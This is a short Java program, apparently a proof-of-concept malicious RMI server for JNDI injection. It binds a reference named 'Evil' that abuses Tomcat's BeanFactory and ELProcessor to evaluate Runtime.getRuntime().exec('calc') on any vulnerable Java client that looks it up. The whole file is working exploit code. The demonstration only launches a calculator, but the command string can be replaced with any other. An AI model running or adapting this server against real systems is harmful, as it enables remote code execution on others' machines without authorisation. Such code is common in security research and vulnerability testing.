package org.example;

import javax.naming.InitialContext;
import javax.naming.Reference;
import javax.naming.StringRefAddr;

import com.sun.jndi.rmi.registry.ReferenceWrapper;
import org.apache.naming.ResourceRef;

import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

public class JNDIRMIBypassServer {
    public static void main(String[] args) throws Exception {

        Registry registry = LocateRegistry.createRegistry(1099);

        ResourceRef ref = new ResourceRef("javax.el.ELProcessor",null,"","",true,
                "org.apache.naming.factory.BeanFactory",null);
        ref.add(new StringRefAddr("forceString","x=eval"));
        ref.add(new StringRefAddr("x","Runtime.getRuntime().exec('calc')"));
        ReferenceWrapper referenceWrapper = new ReferenceWrapper(ref);
        registry.bind("Evil",referenceWrapper);
    }
}
